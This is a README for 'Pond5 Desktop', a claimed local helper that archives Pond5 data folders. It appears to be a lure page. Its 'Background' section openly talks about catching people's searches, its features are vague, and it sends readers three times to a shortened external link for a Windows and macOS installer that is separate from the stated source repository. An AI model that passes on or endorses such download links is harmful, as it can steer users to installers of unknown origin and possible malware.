![Pond5 Desktop](assets/hero.png)

# Pond5 Desktop

*Keep the Pond5 data folder tidy before an update.*

## About

**Pond5 Desktop** runs on your own PC. A local helper for Pond5 data folders, config and export files, and photo albums on Windows and macOS.

Pond5 drops data files next to launcher caches.

Use it when you want the change on this machine without opening a dozen Settings pages.

## Editions

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Features

- Finds the Pond5 data directory.
- Copies config and export files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## Background

People search Pond5 desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/stellar3490/pond5-desktop

MIT license. See `LICENSE`.
